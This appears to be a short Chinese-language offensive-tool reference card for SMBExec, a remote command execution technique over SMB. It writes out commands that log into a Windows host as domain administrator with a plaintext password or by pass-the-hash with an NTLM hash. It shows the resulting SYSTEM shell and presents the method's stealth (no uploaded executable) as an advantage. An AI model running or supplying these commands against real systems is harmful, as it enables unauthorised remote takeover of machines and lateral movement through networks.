### SMBExec

| 属性 | 值 |
|------|-----|
| 版本 | 0.9.24 |
| 平台 | Linux |
| 风险 | 🔴 高 |
| 标签 | `RCE` `SMB` `隐蔽执行` |

## SMBExec 隐蔽远程命令执行

### 使用明文密码连接
```bash
bash smbexec.sh contoso.com/administrator:Admin@123@192.168.1.10
```

### 使用 NTLM Hash 连接 (PTH)
```bash
bash smbexec.sh contoso.com/administrator@192.168.1.10 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

### 执行命令
```bash
C:\Windows\system32> whoami
nt authority\system
```

- ✓ 不上传可执行文件，更加隐蔽
- ✓ 通过批处理脚本和 SMB 管道回显结果
- 直接获取 SYSTEM 权限
